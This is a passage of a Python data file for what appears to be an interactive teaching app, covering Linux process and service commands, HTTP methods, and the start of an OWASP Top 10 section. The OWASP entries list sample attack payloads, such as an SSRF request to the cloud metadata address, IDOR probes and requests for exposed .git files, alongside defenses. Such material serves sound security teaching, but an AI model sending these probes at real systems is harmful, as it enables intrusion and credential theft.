            {"step": 2, "title": "Enhance with colors", "desc": "Uses ncurses colors + mouse support", "from": "htop", "to": "Colors", "data": "Per-core bars", "color": "#f39c12"},
            {"step": 3, "title": "Interactive input", "desc": "Mouse clicks, function keys work live", "from": "User", "to": "htop", "data": "F9 → Kill PID", "color": "#9b59b6"},
            {"step": 4, "title": "Live refresh", "desc": "Updates 4x per second by default", "from": "htop", "to": "Terminal", "data": "Faster refresh", "color": "#27ae60"}
        ]
    },
    {
        "command": "kill PID",
        "desc": "Send SIGTERM (graceful) to process",
        "category": "Control",
        "flags": [
            {"flag": "-15 (default)", "desc": "SIGTERM — polite termination request"},
            {"flag": "-1", "desc": "SIGHUP — reload configuration"},
            {"flag": "-2", "desc": "SIGINT — same as Ctrl+C"},
            {"flag": "-9", "desc": "SIGKILL — force kill, cannot be caught"}
        ],
        "output": """$ ps aux | grep firefox
alice     1234  0.5  2.1 4523456 172032 ?      Sl   10:15   0:12 firefox

$ kill 1234

$ ps aux | grep firefox
alice     1234  0.5  2.1 4523456 172032 ?      Sl   10:15   0:12 firefox

$ # Firefox ignored SIGTERM — will force kill it

$ kill -9 1234

$ ps aux | grep firefox
(no output — process is gone)""",
        "explanation": "Sends a signal to a process. Default SIGTERM (15) asks the process to exit gracefully — it can save files, close sockets, etc. If the process doesn't respond, use SIGKILL (-9) which the kernel enforces.",
        "simulation": [
            {"step": 1, "title": "User runs kill", "desc": "kill 1234 sends SIGTERM to PID 1234", "from": "User", "to": "Kernel", "data": "kill 1234 (SIGTERM)", "color": "#3498db"},
            {"step": 2, "title": "Kernel delivers signal", "desc": "Process gets a signal — may have handler", "from": "Kernel", "to": "Process 1234", "data": "SIGTERM received", "color": "#f39c12"},
            {"step": 3, "title": "Handler runs", "desc": "Well-behaved app saves state and calls exit()", "from": "Process 1234", "to": "App Handler", "data": "Cleanup → exit()", "color": "#9b59b6"},
            {"step": 4, "title": "Or ignores it", "desc": "Bad app ignores SIGTERM — need SIGKILL", "from": "Process 1234", "to": "Kernel", "data": "Ignored → kill -9", "color": "#e74c3c"},
            {"step": 5, "title": "Kernel force-kills", "desc": "SIGKILL cannot be caught — process is terminated", "from": "Kernel", "to": "Process", "data": "SIGKILL → removed", "color": "#27ae60"}
        ]
    },
    {
        "command": "kill -9 PID",
        "desc": "Send SIGKILL (force) — cannot be caught",
        "category": "Control",
        "flags": [
            {"flag": "-9", "desc": "SIGKILL — kernel-level termination, no cleanup"},
            {"flag": "-l", "desc": "List all signal names"}
        ],
        "output": """$ kill -9 5678

$ ps -p 5678
   PID TTY          TIME CMD
(no output — PID no longer exists)

$ dmesg | tail -1
[12345.678] Out of memory: Killed process 5678 (chrome)""",
        "explanation": "SIGKILL (signal 9) is sent directly by the kernel and cannot be ignored or handled by the process. It immediately terminates the process without any cleanup — no file saves, no socket closes. Use only as a last resort.",
        "simulation": [
            {"step": 1, "title": "kill -9 sent", "desc": "User runs kill -9 5678", "from": "User", "to": "Kernel", "data": "SIGKILL signal", "color": "#e74c3c"},
            {"step": 2, "title": "Kernel bypasses handler", "desc": "Signal not queued — kernel acts directly", "from": "Kernel", "to": "Process", "data": "No handler invoked", "color": "#c0392b"},
            {"step": 3, "title": "Memory freed", "desc": "Kernel reclaims process memory, fds, sockets", "from": "Kernel", "to": "Memory Manager", "data": "Freed 172 MB", "color": "#9b59b6"},
            {"step": 4, "title": "Process removed", "desc": "Task table entry deleted — process gone", "from": "Kernel", "to": "Task Table", "data": "PID 5678 deleted", "color": "#27ae60"}
        ]
    },
    {
        "command": "pkill name",
        "desc": "Kill by name pattern",
        "category": "Control",
        "flags": [
            {"flag": "-f", "desc": "Match full command line, not just name"},
            {"flag": "-u user", "desc": "Kill only processes owned by user"},
            {"flag": "-9", "desc": "Use SIGKILL instead of SIGTERM"}
        ],
        "output": """$ pgrep firefox
1234
5678
9012

$ pkill firefox

$ pgrep firefox
(no output — all firefox processes killed)

$ pkill -u alice
(kills all processes owned by alice except current shell)""",
        "explanation": "Kills all processes matching a name or pattern. Much faster than `ps | grep | kill`. Use `-f` to match full command line, `-u user` to target only one user's processes.",
        "simulation": [
            {"step": 1, "title": "Pattern search", "desc": "pkill scans /proc/*/comm for 'firefox'", "from": "pkill", "to": "/proc", "data": "Found 3 matches", "color": "#3498db"},
            {"step": 2, "title": "Extract PIDs", "desc": "Extracts PIDs 1234, 5678, 9012", "from": "pkill", "to": "PID List", "data": "[1234, 5678, 9012]", "color": "#f39c12"},
            {"step": 3, "title": "Send signals", "desc": "Sends SIGTERM to each PID", "from": "pkill", "to": "Kernel", "data": "3 signals sent", "color": "#9b59b6"},
            {"step": 4, "title": "Processes exit", "desc": "All matching processes terminate", "from": "Kernel", "to": "Processes", "data": "0 firefox left", "color": "#27ae60"}
        ]
    },
    {
        "command": "pgrep name",
        "desc": "Find PID by name",
        "category": "Control",
        "flags": [
            {"flag": "-f", "desc": "Match full command line"},
            {"flag": "-u user", "desc": "Only PIDs owned by user"},
            {"flag": "-l", "desc": "Show name along with PID"}
        ],
        "output": """$ pgrep firefox
1234
5678
9012

$ pgrep -l firefox
1234 firefox
5678 firefox
9012 firefox

$ pgrep -u root sshd
742""",
        "explanation": "Returns PIDs matching a pattern — the opposite of `pkill`. Great for scripting: `kill $(pgrep firefox)` is equivalent to `pkill firefox`.",
        "simulation": [
            {"step": 1, "title": "Scan /proc", "desc": "pgrep reads process names", "from": "pgrep", "to": "/proc", "data": "Iterating PIDs", "color": "#3498db"},
            {"step": 2, "title": "Match pattern", "desc": "Regex match against 'firefox'", "from": "pgrep", "to": "Matcher", "data": "1234, 5678, 9012", "color": "#f39c12"},
            {"step": 3, "title": "Print PIDs", "desc": "Outputs one PID per line", "from": "pgrep", "to": "Terminal", "data": "3 PIDs printed", "color": "#27ae60"}
        ]
    },
    {
        "command": "systemctl start service",
        "desc": "Start a systemd service",
        "category": "Services",
        "flags": [
            {"flag": "start", "desc": "Start the service now"},
            {"flag": "stop", "desc": "Stop the service"},
            {"flag": "restart", "desc": "Stop then start"},
            {"flag": "reload", "desc": "Reload config without stopping"},
            {"flag": "status", "desc": "Show current state"},
            {"flag": "enable", "desc": "Start at boot"},
            {"flag": "disable", "desc": "Don't start at boot"},
            {"flag": "is-active", "desc": "Returns 'active' or 'inactive'"}
        ],
        "output": """$ sudo systemctl start nginx

$ sudo systemctl status nginx
● nginx.service - A high performance web server and a reverse proxy server
     Loaded: loaded (/lib/systemd/system/nginx.service; enabled; preset: enabled)
     Active: active (running) since Mon 2024-01-15 14:23:45 UTC; 2s ago
       Docs: man:nginx(8)
   Main PID: 4567 (nginx)
      Tasks: 2 (limit: 4647)
     Memory: 3.4M
        CPU: 12ms
     CGroup: /system.slice/nginx.service
             ├─4567 "nginx: master process /usr/sbin/nginx"
             └─4568 "nginx: worker process" """,
        "explanation": "systemd is the modern init system. `systemctl start` starts a service now; `enable` makes it start at boot; `status` shows current state and logs. All services live in /lib/systemd/system/*.service.",
        "simulation": [
            {"step": 1, "title": "systemctl reads unit", "desc": "Parses /lib/systemd/system/nginx.service", "from": "systemctl", "to": "Unit File", "data": "ExecStart=...", "color": "#3498db"},
            {"step": 2, "title": "Checks dependencies", "desc": "Verifies required services are running", "from": "systemctl", "to": "Dependency", "data": "After=network.target", "color": "#f39c12"},
            {"step": 3, "title": "Spawns process", "desc": "Fork + exec the ExecStart command", "from": "systemd", "to": "nginx", "data": "PID 4567 created", "color": "#9b59b6"},
            {"step": 4, "title": "Registers in cgroup", "desc": "Adds process to /sys/fs/cgroup/system.slice/", "from": "systemd", "to": "Cgroups", "data": "nginx.service cgroup", "color": "#e74c3c"},
            {"step": 5, "title": "Marks active", "desc": "Service state → active (running)", "from": "systemd", "to": "Status", "data": "active (running)", "color": "#27ae60"}
        ]
    },
    {
        "command": "systemctl stop service",
        "desc": "Stop a systemd service",
        "category": "Services",
        "flags": [
            {"flag": "stop", "desc": "Stop immediately"},
            {"flag": "-f", "desc": "Force stop"},
            {"flag": "--no-block", "desc": "Return before completion"}
        ],
        "output": """$ sudo systemctl stop nginx

$ sudo systemctl status nginx
○ nginx.service - A high performance web server and a reverse proxy server
     Loaded: loaded (/lib/systemd/system/nginx.service; enabled; preset: enabled)
     Active: inactive (dead) since Mon 2024-01-15 14:25:12 UTC; 1s ago
    Process: 4567 ExecStop=/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid
   Main PID: 4567 (code=exited, status=0/SUCCESS)
     Status: "Shutting down..."

Jan 15 14:25:12 host systemd[1]: Stopping nginx.service - A high performance web server...
Jan 15 14:25:12 host systemd[1]: nginx.service: Deactivated successfully.
Jan 15 14:25:12 host systemd[1]: Stopped nginx.service - A high performance web server.""",
        "explanation": "Stops a running service cleanly. Sends SIGTERM (via ExecStop= directive), waits for graceful shutdown, then confirms 'inactive (dead)'. Note: 'stop' does NOT disable it — it will still start at boot if enabled.",
        "simulation": [
            {"step": 1, "title": "Send SIGTERM", "desc": "systemd sends SIGTERM to main PID", "from": "systemd", "to": "nginx (4567)", "data": "SIGTERM", "color": "#e74c3c"},
            {"step": 2, "title": "Grace period", "desc": "Waits up to TimeoutStopSec (90s default)", "from": "systemd", "to": "Timer", "data": "Timeout 90s", "color": "#f39c12"},
            {"step": 3, "title": "Worker processes exit", "desc": "nginx gracefully finishes requests", "from": "nginx workers", "to": "Exit", "data": "Workers quit", "color": "#9b59b6"},
            {"step": 4, "title": "Confirm inactive", "desc": "Service marked inactive (dead)", "from": "systemd", "to": "Status", "data": "inactive (dead)", "color": "#27ae60"}
        ]
    },
    {
        "command": "systemctl enable service",
        "desc": "Start service at boot",
        "category": "Services",
        "flags": [
            {"flag": "enable", "desc": "Create symlink in .wants/"},
            {"flag": "disable", "desc": "Remove the symlink"},
            {"flag": "--now", "desc": "Enable and start immediately"},
            {"flag": "is-enabled", "desc": "Check if enabled"}
        ],
        "output": """$ sudo systemctl enable nginx
Synchronizing state of nginx.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable nginx
Created symlink /etc/systemd/system/multi-user.target.wants/nginx.service → /lib/systemd/system/nginx.service.

$ sudo systemctl is-enabled nginx
enabled

$ ls -la /etc/systemd/system/multi-user.target.wants/ | grep nginx
lrwxrwxrwx 1 root root 40 Jan 15 14:26 nginx.service -> /lib/systemd/system/nginx.service""",
        "explanation": "Creates a symlink in `/etc/systemd/system/multi-user.target.wants/` pointing to the service unit. When the system reaches multi-user.target at boot, systemd starts every service symlinked there.",
        "simulation": [
            {"step": 1, "title": "Read unit file", "desc": "Check [Install] section for WantedBy=", "from": "systemctl", "to": "Unit File", "data": "WantedBy=multi-user.target", "color": "#3498db"},
            {"step": 2, "title": "Create symlink", "desc": "Symbolic link in .wants/ directory", "from": "systemctl", "to": "/etc/systemd/system/", "data": "multi-user.target.wants/nginx.service →", "color": "#f39c12"},
            {"step": 3, "title": "Mark enabled", "desc": "Service will auto-start on next boot", "from": "systemctl", "to": "State", "data": "enabled", "color": "#27ae60"}
        ]
    },
    {
        "command": "systemctl status service",
        "desc": "Check service status",
        "category": "Services",
        "flags": [
            {"flag": "status", "desc": "Show current state + recent logs"},
            {"flag": "--no-pager", "desc": "Don't use pager"},
            {"flag": "-l", "desc": "Show full log lines (don't truncate)"},
            {"flag": "-n 50", "desc": "Show last 50 log lines"}
        ],
        "output": """$ systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: active (running) since Mon 2024-01-15 09:00:12 UTC; 5h ago
       Docs: man:sshd(8)
             man:sshd_config(5)
   Main PID: 890 (sshd)
      Tasks: 1 (limit: 4647)
     Memory: 4.8M
        CPU: 345ms
     CGroup: /system.slice/ssh.service
             └─890 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

Jan 15 09:00:12 host systemd[1]: Starting ssh.service - OpenBSD Secure Shell server...
Jan 15 09:00:12 host sshd[890]: Server listening on 0.0.0.0 port 22.
Jan 15 09:00:12 host systemd[1]: Started ssh.service - OpenBSD Secure Shell server.""",
        "explanation": "Shows the current state (loaded, active, PID), memory usage, cgroup, and recent log lines (last 10 by default). The dot at the start is color-coded: green=running, white=stopped, red=failed.",
        "simulation": [
            {"step": 1, "title": "Query state", "desc": "systemctl asks systemd for unit state", "from": "systemctl", "to": "systemd", "data": "GetUnit(ssh.service)", "color": "#3498db"},
            {"step": 2, "title": "Fetch metadata", "desc": "Reads state, memory, cgroup info", "from": "systemd", "to": "State DB", "data": "active (running)", "color": "#f39c12"},
            {"step": 3, "title": "Fetch logs", "desc": "Reads last N entries from journal", "from": "systemd", "to": "journald", "data": "Last 10 lines", "color": "#9b59b6"},
            {"step": 4, "title": "Print report", "desc": "Formats and prints to terminal", "from": "systemctl", "to": "Terminal", "data": "Status displayed", "color": "#27ae60"}
        ]
    },
    {
        "command": "journalctl -u service",
        "desc": "View service logs",
        "category": "Logs",
        "flags": [
            {"flag": "-u name", "desc": "Show logs for specific unit"},
            {"flag": "-f", "desc": "Follow (like tail -f)"},
            {"flag": "--since", "desc": "Show logs since time (e.g., '1 hour ago')"},
            {"flag": "-p err", "desc": "Only error priority"},
            {"flag": "-n 100", "desc": "Last 100 lines"},
            {"flag": "--no-pager", "desc": "Don't use pager"}
        ],
        "output": """$ journalctl -u ssh --since "10 minutes ago"
-- Logs begin at Mon 2024-01-15 09:00:12 UTC, end at Mon 2024-01-15 14:35:00 UTC. --
Jan 15 14:28:12 host sshd[890]: Accepted password for alice from 192.168.1.50 port 51234 ssh2
Jan 15 14:28:12 host sshd[890]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Jan 15 14:30:45 host sshd[890]: Received disconnect from 192.168.1.50 port 51234:11: Bye Bye
Jan 15 14:30:45 host sshd[890]: pam_unix(sshd:session): session closed for user alice

$ journalctl -u nginx -f
(Follow mode — displays new logs as they arrive)""",
        "explanation": "The modern log viewer. systemd stores logs in a binary format (journald). journalctl queries it with powerful filters — by unit, time, priority, or content. Much faster than grepping /var/log files.",
        "simulation": [
            {"step": 1, "title": "Query journald", "desc": "journalctl asks journald for matching entries", "from": "journalctl", "to": "journald", "data": "Filter: _SYSTEMD_UNIT=ssh.service", "color": "#3498db"},
            {"step": 2, "title": "Match time range", "desc": "Filters by --since and --until", "from": "journald", "to": "Index", "data": "10 min window", "color": "#f39c12"},
            {"step": 3, "title": "Return entries", "desc": "Reads from /var/log/journal/", "from": "journald", "to": "Binary Journal", "data": "Found 42 entries", "color": "#9b59b6"},
            {"step": 4, "title": "Display", "desc": "Formats entries and pipes to pager", "from": "journalctl", "to": "Terminal", "data": "Log lines shown", "color": "#27ae60"}
        ]
    }
]




# ==================== WEB: HOW THE WEB WORKS ====================
URL_ANATOMY = {
    "example": "https://shop.example.com:8443/products/iphone?color=black&storage=256#reviews",
    "parts": [
        {"part": "https",        "name": "Scheme / Protocol", "color": "#e74c3c", "desc": "How to communicate. Common: http, https, ftp, ws, wss", "position": "1"},
        {"part": "shop.", "name": "Subdomain", "color": "#e67e22", "desc": "Optional prefix (www, shop, api, admin)", "position": "2"},
        {"part": "example.com",  "name": "Domain", "color": "#f39c12", "desc": "Registered domain name — resolved by DNS", "position": "3"},
        {"part": ".com",         "name": "TLD", "color": "#f1c40f", "desc": "Top-Level Domain (com, org, net, io, dev)", "position": "4"},
        {"part": ":8443",        "name": "Port", "color": "#27ae60", "desc": "Port number. Default 80 (http), 443 (https)", "position": "5"},
        {"part": "/products/iphone", "name": "Path", "color": "#3498db", "desc": "Resource location on the server", "position": "6"},
        {"part": "?color=black&storage=256", "name": "Query String", "color": "#9b59b6", "desc": "Parameters sent to the server (key=value pairs)", "position": "7"},
        {"part": "#reviews",     "name": "Fragment", "color": "#8e44ad", "desc": "Client-side anchor — NOT sent to server", "position": "8"}
    ]
}

HTTP_METHODS = [
    {
        "method": "GET",
        "safe": True,
        "idempotent": True,
        "body": "No",
        "purpose": "Retrieve data from the server. Parameters are visible in the URL.",
        "color": "#27ae60",
        "url_example": "https://api.example.com/users?role=admin&limit=10",
        "full_request": """GET /users?role=admin&limit=10 HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Cookie: session=abc123

(no body)""",
        "full_response": """HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 342

[
  {"id": 1, "name": "Alice", "role": "admin"},
  {"id": 2, "name": "Bob",   "role": "admin"}
]""",
        "data_location": "URL query string (?key=value&key2=value2)",
        "security_note": "Data appears in browser history, server logs, and referrer headers. NEVER use GET for passwords, tokens, or sensitive data.",
        "when_to_use": [
            "Fetching web pages, API data, images",
            "Search queries (?q=term)",
            "Filtering and pagination (?page=2&sort=name)",
            "Any read-only, idempotent operation"
        ]
    },
    {
        "method": "POST",
        "safe": False,
        "idempotent": False,
        "body": "Yes",
        "purpose": "Submit data to the server. Parameters are hidden in the request body.",
        "color": "#3498db",
        "url_example": "https://api.example.com/login   ← note: no data in URL",
        "full_request": """POST /login HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Cookie: session=abc123

username=admin&password=secret123""",
        "full_response": """HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=NEW_TOKEN_HERE; HttpOnly; Secure

{"success": true, "user_id": 42}""",
        "data_location": "Request body (after the blank line)",
        "security_note": "Data is NOT in the URL — safer than GET for sensitive info, but still transmitted. Always use HTTPS for POST with credentials.",
        "when_to_use": [
            "Login forms, registration",
            "File uploads",
            "Submitting comments, orders, tickets",
            "Any operation that changes server state"
        ]
    },
    {
        "method": "PUT",
        "safe": False,
        "idempotent": True,
        "body": "Yes",
        "purpose": "Create or fully replace a resource at a known URL.",
        "color": "#f39c12",
        "url_example": "https://api.example.com/users/42   ← the ID is in the URL",
        "full_request": """PUT /users/42 HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 67

{"name": "Alice Smith", "email": "alice@example.com", "role": "admin"}""",
        "full_response": """HTTP/1.1 200 OK
Content-Type: application/json

{"id": 42, "name": "Alice Smith", "email": "alice@example.com", "role": "admin"}""",
        "data_location": "Request body — the target is identified by URL",
        "security_note": "PUT is idempotent — sending the same PUT request 100 times gives the same result as 1 time. It replaces the entire resource.",
        "when_to_use": [
            "Updating an entire resource",
            "RESTful APIs replacing a document",
            "Idempotent operations (safe to retry)"
        ]
    },
    {
        "method": "PATCH",
        "safe": False,
        "idempotent": False,
        "body": "Yes",
        "purpose": "Partially update a resource — only send the fields you're changing.",
        "color": "#e67e22",
        "url_example": "https://api.example.com/users/42",
        "full_request": """PATCH /users/42 HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 28

{"email": "newemail@example.com"}""",
        "full_response": """HTTP/1.1 200 OK
Content-Type: application/json

{"id": 42, "name": "Alice Smith", "email": "newemail@example.com", "role": "admin"}""",
        "data_location": "Request body — only fields to change",
        "security_note": "Not idempotent — sending twice may fail (e.g., if the email is already changed). Use PUT when replacing everything.",
        "when_to_use": [
            "Updating just one field (email, password)",
            "RESTful partial updates",
            "Efficient API calls (send less data)"
        ]
    },
    {
        "method": "DELETE",
        "safe": False,
        "idempotent": True,
        "body": "Optional",
        "purpose": "Delete a resource at the given URL.",
        "color": "#e74c3c",
        "url_example": "https://api.example.com/users/42",
        "full_request": """DELETE /users/42 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOi...

(no body needed)""",
        "full_response": """HTTP/1.1 204 No Content
(empty response body)""",
        "data_location": "The URL itself — you're deleting whatever it points to",
        "security_note": "Idempotent — deleting the same resource twice gives the same result (204 both times). No body usually needed.",
        "when_to_use": [
            "Deleting records (users, posts, orders)",
            "Removing files",
            "RESTful APIs"
        ]
    },
    {
        "method": "HEAD",
        "safe": True,
        "idempotent": True,
        "body": "No",
        "purpose": "Same as GET but returns ONLY headers — no body. Used to check if a resource exists or get its size/modified date.",
        "color": "#9b59b6",
        "url_example": "https://cdn.example.com/image.jpg",
        "full_request": """HEAD /image.jpg HTTP/1.1
Host: cdn.example.com
User-Agent: Mozilla/5.0""",
        "full_response": """HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Length: 245678
Last-Modified: Mon, 15 Jan 2024 14:23:45 GMT
ETag: "abc123def456"

(no body — just headers)""",
        "data_location": "No data sent — checks metadata only",
        "security_note": "Useful for checking if a file exists without downloading it. Saves bandwidth.",
        "when_to_use": [
            "Check if a URL exists (returns 200 or 404)",
            "Get file size before download",
            "Cache validation"
        ]
    },
    {
        "method": "OPTIONS",
        "safe": True,
        "idempotent": True,
        "body": "No",
        "purpose": "Ask the server which HTTP methods are allowed on a URL. Used by CORS preflight requests.",
        "color": "#16a085",
        "url_example": "https://api.example.com/users",
        "full_request": """OPTIONS /users HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST""",
        "full_response": """HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Max-Age: 86400""",
        "data_location": "No data — this is a capability query",
        "security_note": "Browsers send OPTIONS automatically before cross-origin POST/PUT/DELETE. The server tells the browser what's allowed (CORS).",
        "when_to_use": [
            "CORS preflight requests (browser does this automatically)",
            "API discovery — see what methods exist",
            "Testing endpoint capabilities"
        ]
    },
    {
        "method": "TRACE",
        "safe": True,
        "idempotent": True,
        "body": "No",
        "purpose": "Echoes back the request as received — used for debugging. Usually DISABLED on production servers (XST attack).",
        "color": "#95a5a6",
        "url_example": "https://example.com/debug",
        "full_request": """TRACE /debug HTTP/1.1
Host: example.com
X-Custom-Header: test123""",
        "full_response": """HTTP/1.1 200 OK
Content-Type: message/http

TRACE /debug HTTP/1.1
Host: example.com
X-Custom-Header: test123""",
        "data_location": "The request itself is sent back",
        "security_note": "Usually disabled — attackers use it for Cross-Site Tracing (XST) to bypass HttpOnly cookies.",
        "when_to_use": [
            "Debugging — verify proxies aren't modifying requests",
            "Almost never in production — disable it"
        ]
    }
]

HTTP_HEADERS = [
    {"header": "Host", "example": "Host: example.com", "desc": "Required in HTTP/1.1 — the domain being requested"},
    {"header": "User-Agent", "example": "User-Agent: Mozilla/5.0 ...", "desc": "Browser/client identifier"},
    {"header": "Cookie", "example": "Cookie: session=abc123; lang=en", "desc": "Session and preference data"},
    {"header": "Authorization", "example": "Authorization: Bearer eyJ...", "desc": "Credentials (Basic, Bearer, etc.)"},
    {"header": "Content-Type", "example": "Content-Type: application/json", "desc": "Format of the request body"},
    {"header": "Accept", "example": "Accept: text/html,application/xml", "desc": "Formats client accepts"},
    {"header": "Referer", "example": "Referer: https://google.com", "desc": "Previous page (misspelled on purpose in RFC)"},
    {"header": "X-Forwarded-For", "example": "X-Forwarded-For: 1.2.3.4", "desc": "Real client IP when behind a proxy"},
    {"header": "Origin", "example": "Origin: https://app.example.com", "desc": "Used by CORS"},
    {"header": "Set-Cookie", "example": "Set-Cookie: session=abc; HttpOnly", "desc": "Server sets a cookie in the response"}
]

HTTP_STATUS = [
    {"code": 200, "name": "OK", "desc": "Success", "color": "#27ae60"},
    {"code": 201, "name": "Created", "desc": "Resource created", "color": "#27ae60"},
    {"code": 301, "name": "Moved Permanently", "desc": "Permanent redirect", "color": "#3498db"},
    {"code": 302, "name": "Found", "desc": "Temporary redirect", "color": "#3498db"},
    {"code": 400, "name": "Bad Request", "desc": "Malformed request", "color": "#e67e22"},
    {"code": 401, "name": "Unauthorized", "desc": "Auth required", "color": "#e74c3c"},
    {"code": 403, "name": "Forbidden", "desc": "Authenticated but not allowed", "color": "#e74c3c"},
    {"code": 404, "name": "Not Found", "desc": "Resource missing", "color": "#c0392b"},
    {"code": 500, "name": "Internal Server Error", "desc": "Server crashed", "color": "#c0392b"},
    {"code": 502, "name": "Bad Gateway", "desc": "Upstream error", "color": "#8e44ad"},
    {"code": 503, "name": "Service Unavailable", "desc": "Overloaded/maintenance", "color": "#8e44ad"}
]

WEB_REQUEST_FLOW = [
    {"step": 1, "title": "You type a URL", "desc": "Browser parses https://shop.example.com/products", "from": "User", "to": "Browser", "data": "URL entered", "color": "#3498db"},
    {"step": 2, "title": "DNS lookup", "desc": "Browser asks DNS: what's the IP of shop.example.com?", "from": "Browser", "to": "DNS Server", "data": "Query shop.example.com", "color": "#f39c12"},
    {"step": 3, "title": "DNS responds", "desc": "Returns IP: 93.184.216.34", "from": "DNS Server", "to": "Browser", "data": "93.184.216.34", "color": "#27ae60"},
    {"step": 4, "title": "TCP handshake", "desc": "SYN → SYN-ACK → ACK on port 443", "from": "Browser", "to": "Web Server", "data": "3-way handshake", "color": "#e74c3c"},
    {"step": 5, "title": "TLS handshake", "desc": "Encryption setup + certificate validation", "from": "Browser", "to": "Web Server", "data": "SSL/TLS ready", "color": "#9b59b6"},
    {"step": 6, "title": "HTTP GET request", "desc": "Browser sends request + headers + cookies", "from": "Browser", "to": "Web Server", "data": "GET /products HTTP/1.1", "color": "#3498db"},
    {"step": 7, "title": "Server processes", "desc": "App queries DB, builds response", "from": "Web Server", "to": "Application", "data": "Backend processing", "color": "#e67e22"},
    {"step": 8, "title": "HTTP response", "desc": "Status 200 + HTML + cookies", "from": "Web Server", "to": "Browser", "data": "200 OK + HTML", "color": "#27ae60"},
    {"step": 9, "title": "Render page", "desc": "Browser parses HTML, loads CSS/JS/images", "from": "Browser", "to": "User", "data": "Page displayed", "color": "#16a085"}
]
# ==================== OWASP TOP 10 (2025) ====================
OWASP_TOP10 = [
    {
        "rank": "A01",
        "id": "broken_access_control",
        "title": "Broken Access Control",
        "icon": "🚪",
        "color": "#e74c3c",
        "severity": "Critical",
        "summary": "Users can access data or perform actions they shouldn't be able to. SSRF is now included in this category.",
        "description": "Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data. Server-Side Request Forgery (SSRF) has been merged into this category in 2025[citation:3][citation:14].",
        "examples": [
            "Accessing /admin while logged in as a regular user",
            "Changing ?user_id=5 to ?user_id=6 in the URL to see another user's data (IDOR)",
            "SSRF: Making the server fetch http://169.254.169.254/ (cloud metadata)",
            "Missing function-level access control (API endpoints without checks)"
        ],
        "real_world": "In 2021, Parler exposed its entire database because API endpoints lacked authorization checks. Attackers downloaded 70TB of data. SSRF also played a key role in the 2019 Capital One breach[citation:17].",
        "payloads": [
            {"payload": "GET /admin", "note": "Direct access to admin panel"},
            {"payload": "GET /api/users/42", "note": "IDOR — change ID to see another user"},
            {"payload": "http://169.254.169.254/latest/meta-data/", "note": "SSRF — AWS metadata access"}
        ],
        "defense": [
            "Deny by default — require explicit authorization",
            "Use role-based access control (RBAC) server-side",
            "Validate and allowlist URLs for SSRF-prone features (webhooks, previews)[citation:6]",
            "Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)"
        ],
        "simulation": [
            {"step": 1, "title": "Attacker logs in", "desc": "Regular user 'alice' with user_id=5", "from": "Alice", "to": "App", "data": "Login OK", "color": "#27ae60"},
            {"step": 2, "title": "Access own data", "desc": "GET /api/users/5 → 200 OK", "from": "Alice", "to": "API", "data": "Own profile", "color": "#3498db"},
            {"step": 3, "title": "Change ID", "desc": "Attacker changes 5 → 1 (admin user)", "from": "Alice", "to": "API", "data": "GET /api/users/1", "color": "#f39c12"},
            {"step": 4, "title": "No check!", "desc": "API returns admin's profile — IDOR!", "from": "API", "to": "Alice", "data": "admin data leaked", "color": "#e74c3c"}
        ]
    },
    {
        "rank": "A02",
        "id": "security_misconfiguration",
        "title": "Security Misconfiguration",
        "icon": "⚙️",
        "color": "#e67e22",
        "severity": "Critical",
        "summary": "Insecure defaults, verbose errors, exposed admin panels, missing security headers.",
        "description": "The most commonly seen issue. Includes default accounts, verbose errors revealing stack traces, missing security headers, open cloud storage, and unnecessary features enabled[citation:7][citation:14]. This category jumped from #5 to #2 in 2025.",
        "examples": [
            "Default credentials: admin/admin",
            "Directory listing enabled",
            "Debug mode on in production (DEBUG=True)",
            "Exposed phpMyAdmin or .git directories",
            "Missing security headers (CSP, HSTS, X-Frame-Options)"
        ],
        "real_world": "In 2019, First American Financial leaked 885 million records because their document sharing URL contained a simple incrementing number — no auth check. Cloud buckets left public remain a leading cause of breaches[citation:14].",
        "payloads": [
            {"payload": "GET /.git/config", "note": "Exposed git repo — download source"},
            {"payload": "GET /admin.php.bak", "note": "Backup files left on server"},
            {"payload": "GET /phpinfo.php", "note": "Information disclosure"}
        ],
        "defense": [
            "Automate hardening with IaC (Terraform, Ansible)",
            "Remove unused features and default accounts",
            "Review cloud storage permissions",
            "Use security headers (CSP, HSTS, X-Frame-Options)",
            "Disable directory listings and debug modes"
        ],
        "simulation": [
            {"step": 1, "title": "Recon phase", "desc": "Attacker scans with nikto + gobuster", "from": "Attacker", "to": "Target", "data": "Directory scan", "color": "#3498db"},
            {"step": 2, "title": "Finds /.git/", "desc": "Directory listing enabled", "from": "Target", "to": "Attacker", "data": "200 OK — /.git/", "color": "#e67e22"},
            {"step": 3, "title": "Downloads source", "desc": "Uses git-dumper to reconstruct code", "from": "Attacker", "to": "Files", "data": "Source code leaked", "color": "#e74c3c"},
            {"step": 4, "title": "Finds API keys", "desc": "config.py has AWS keys hardcoded", "from": "Attacker", "to": "Cloud", "data": "Full account takeover", "color": "#c0392b"}
        ]
    },
    {
        "rank": "A03",
        "id": "supply_chain_failures",
        "title": "Software Supply Chain Failures",
        "icon": "📦",
        "color": "#f39c12",
        "severity": "Critical",
        "summary": "Compromised dependencies, build systems, or distribution pipelines.",
